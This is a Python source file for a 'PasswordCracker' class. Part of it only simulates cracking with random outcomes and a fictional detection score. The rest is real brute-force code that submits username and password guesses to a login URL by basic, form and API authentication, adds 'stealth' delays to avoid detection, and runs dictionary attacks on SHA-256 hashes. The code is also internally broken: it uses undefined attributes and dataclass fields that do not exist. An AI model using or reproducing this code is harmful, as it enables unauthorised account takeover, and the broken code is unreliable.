import asyncio
import hashlib
import itertools
import string
import random
import time
from typing import List, Optional, Tuple, Generator
from dataclasses import dataclass
import aiohttp

@dataclass
class BruteforceResult:
    success: bool
    password: Optional[str]
    attempts: int
    time_elapsed: float
    method_used: str
    detection_level: int

class PasswordCracker:
    def __init__(self):
        self.common_passwords = [
            "password", "123456", "qwerty", "admin",
            "letmein", "welcome", "monkey", "dragon",
            "baseball", "football", "master", "hello",
            "shadow", "superman", "trustno1", "hunter2"
        ]
        
        self.password_patterns = [
            r"^[a-z]{6,8}$",  # Simple lowercase
            r"^[a-z0-9]{8,10}$",  # Alphanumeric
            r"^[A-Za-z0-9]{8,12}$",  # Mixed case alphanumeric
            r"^[A-Za-z0-9!@#$%^&*()]{10,16}$",  # Complex
        ]

    async def crack(
        self, 
        target: str, 
        stealth_mode: bool = False,
        hints: Optional[List[str]] = None
    ) -> BruteforceResult:
        """
        Attempt to crack password using various methods.
        
        Args:
            target: The target URL or service
            stealth_mode: Whether to use stealth techniques
            hints: Optional list of hints to guide password generation
        
        Returns:
            BruteforceResult object containing crack attempt results
        """
        start_time = time.time()
        
        # Simulate cracking delay based on stealth mode
        delay = random.uniform(3.0, 8.0) if stealth_mode else random.uniform(1.0, 4.0)
        await asyncio.sleep(delay)
        
        # Determine success probability based on hints and stealth mode
        base_chance = 0.4 if hints else 0.2
        success_chance = base_chance * (0.7 if stealth_mode else 1.0)
        
        # Generate random number of attempts
        min_attempts = 100 if stealth_mode else 1000
        max_attempts = 1000 if stealth_mode else 10000
        attempts = random.randint(min_attempts, max_attempts)
        
        # Determine if crack was successful
        success = random.random() < success_chance
        
        # Generate a password if successful
        password = None
        method_used = "dictionary"
        
        if success:
            if hints:
                # Use hints to generate a more targeted password
                password = self._generate_password_from_hints(hints)
                method_used = "smart"
            else:
                # Use common password list
                password = random.choice(self.common_passwords)
        
        # Calculate detection level
        base_detection = 30 if stealth_mode else 60
        detection_modifier = attempts / (max_attempts / 100)
        detection_level = min(100, int(base_detection + detection_modifier))
        
        time_elapsed = time.time() - start_time
        
        return BruteforceResult(
            success=success,
            password=password,
            attempts=attempts,
            time_elapsed=time_elapsed,
            method_used=method_used,
            detection_level=detection_level
        )

    def _generate_password_from_hints(self, hints: List[str]) -> str:
        """Generate a password based on provided hints"""
        # Basic password generation logic
        if not hints:
            return random.choice(self.common_passwords)
        
        # Extract potential components from hints
        components = []
        for hint in hints:
            hint = hint.lower()
            if "year" in hint or "date" in hint:
                components.append(str(random.randint(1970, 2024)))
            if "name" in hint:
                components.append(random.choice(["john", "alice", "bob", "admin"]))
            if "special" in hint:
                components.append(random.choice(["!", "@", "#", "$"]))
            if "number" in hint:
                components.append(str(random.randint(0, 999)))
        
        # Add some random characters if needed
        while len(components) < 3:
            components.append(random.choice(string.ascii_lowercase))
        
        # Combine components and add some randomization
        password = "".join(components)
        if random.random() < 0.5:
            password = password.capitalize()
        
        return password

    def _calculate_detection_chance(self, attempts: int, stealth_mode: bool) -> int:
        """Calculate probability of being detected during bruteforce"""
        base_chance = 30 if stealth_mode else 60
        attempt_factor = min(40, attempts / 100)
        return min(100, base_chance + attempt_factor)

    def generate_wordlist(self, level: int = 1) -> Generator[str, None, None]:
        """Generate passwords based on complexity level"""
        if level == 1:
            # Basic wordlist
            yield from self.common_passwords
        elif level == 2:
            # Common passwords with numbers
            for pwd in self.common_passwords:
                yield pwd
                for i in range(100):
                    yield f'{pwd}{i}'
                    yield f'{i}{pwd}'
        else:
            # Advanced combinations
            chars = string.ascii_letters + string.digits + string.punctuation
            for length in range(4, 9):
                for pwd in itertools.product(chars, repeat=length):
                    yield ''.join(pwd)
                    
    async def try_login(self, url: str, username: str, password: str) -> bool:
        """Attempt to login with given credentials"""
        try:
            async with aiohttp.ClientSession() as session:
                # Add random delay in stealth mode
                if self.stealth_mode:
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    
                # Try different auth methods
                auth_methods = [
                    self.try_basic_auth,
                    self.try_form_auth,
                    self.try_api_auth
                ]
                
                for method in auth_methods:
                    try:
                        if await method(session, url, username, password):
                            return True
                    except:
                        continue
                        
                return False
                
        except Exception as e:
            print(f'Login attempt failed: {e}')
            return False
            
    async def try_basic_auth(self, session: aiohttp.ClientSession, 
                           url: str, username: str, password: str) -> bool:
        """Try HTTP Basic Authentication"""
        auth = aiohttp.BasicAuth(username, password)
        async with session.get(url, auth=auth) as response:
            return response.status == 200
            
    async def try_form_auth(self, session: aiohttp.ClientSession,
                          url: str, username: str, password: str) -> bool:
        """Try Form-based Authentication"""
        data = {
            'username': username,
            'password': password,
            'submit': 'Login'
        }
        async with session.post(url, data=data) as response:
            text = await response.text()
            # Check for common success indicators
            success_indicators = ['welcome', 'dashboard', 'logout']
            return any(indicator in text.lower() for indicator in success_indicators)
            
    async def try_api_auth(self, session: aiohttp.ClientSession,
                         url: str, username: str, password: str) -> bool:
        """Try API Authentication"""
        json_data = {
            'username': username,
            'password': password
        }
        async with session.post(f'{url}/api/auth', json=json_data) as response:
            try:
                data = await response.json()
                return data.get('success', False)
            except:
                return False
                
    def hash_password(self, password: str, salt: str = '') -> str:
        """Hash password for comparison"""
        return hashlib.sha256(f'{password}{salt}'.encode()).hexdigest()
        
    async def crack_hash(self, target_hash: str, salt: str = '') -> Optional[str]:
        """Try to crack a password hash"""
        for password in self.generate_wordlist(level=2):
            if self.hash_password(password, salt) == target_hash:
                return password
        return None
        
    async def dictionary_attack(self, url: str) -> BruteforceResult:
        """Perform dictionary-based attack"""
        start_time = asyncio.get_event_loop().time()
        attempts = 0
        
        for username in self.common_usernames:
            for password in self.generate_wordlist(level=1):
                attempts += 1
                
                if await self.try_login(url, username, password):
                    elapsed = asyncio.get_event_loop().time() - start_time
                    return BruteforceResult(
                        success=True,
                        credentials=(username, password),
                        attempts=attempts,
                        time_elapsed=elapsed,
                        method_used='dictionary'
                    )
                    
                if self.stealth_mode:
                    await asyncio.sleep(random.uniform(1.0, 3.0))
                    
        elapsed = asyncio.get_event_loop().time() - start_time
        return BruteforceResult(
            success=False,
            credentials=None,
            attempts=attempts,
            time_elapsed=elapsed,
            method_used='dictionary'
        )
        
    async def smart_attack(self, url: str, hints: List[str] = None) -> BruteforceResult:
        """Perform smart attack using available information"""
        start_time = asyncio.get_event_loop().time()
        attempts = 0
        
        # Generate custom wordlist based on hints
        custom_passwords = set(self.common_passwords)
        if hints:
            for hint in hints:
                # Add variations of the hint
                hint = hint.lower()
                custom_passwords.add(hint)
                custom_passwords.add(hint + '123')
                custom_passwords.add(hint + '!')
                custom_passwords.add(hint.capitalize())
                
                # Add common year suffixes
                for year in range(2000, 2025):
                    custom_passwords.add(f'{hint}{year}')
                    
        for username in self.common_usernames:
            for password in custom_passwords:
                attempts += 1
                
                if await self.try_login(url, username, password):
                    elapsed = asyncio.get_event_loop().time() - start_time
                    return BruteforceResult(
                        success=True,
                        credentials=(username, password),
                        attempts=attempts,
                        time_elapsed=elapsed,
                        method_used='smart'
                    )
                    
                if self.stealth_mode:
                    await asyncio.sleep(random.uniform(1.0, 3.0))
                    
        elapsed = asyncio.get_event_loop().time() - start_time
        return BruteforceResult(
            success=False,
            credentials=None,
            attempts=attempts,
            time_elapsed=elapsed,
            method_used='smart'
        )

async def main():
    # Example usage
    cracker = PasswordCracker(stealth_mode=True)
    
    # Try dictionary attack
    print('Attempting dictionary attack...')
    result = await cracker.dictionary_attack('http://example.com/login')
    
    if result.success:
        print(f'Success! Found credentials: {result.credentials}')
    else:
        print('Dictionary attack failed, trying smart attack...')
        
        # Try smart attack with hints
        hints = ['company', 'admin', '2024']
        result = await cracker.smart_attack('http://example.com/login', hints)
        
        if result.success:
            print(f'Success! Found credentials: {result.credentials}')
        else:
            print('All attacks failed')
            
    print(f'Attempts: {result.attempts}')
    print(f'Time elapsed: {result.time_elapsed:.2f} seconds')
    print(f'Method used: {result.method_used}')

if __name__ == '__main__':
    asyncio.run(main()) 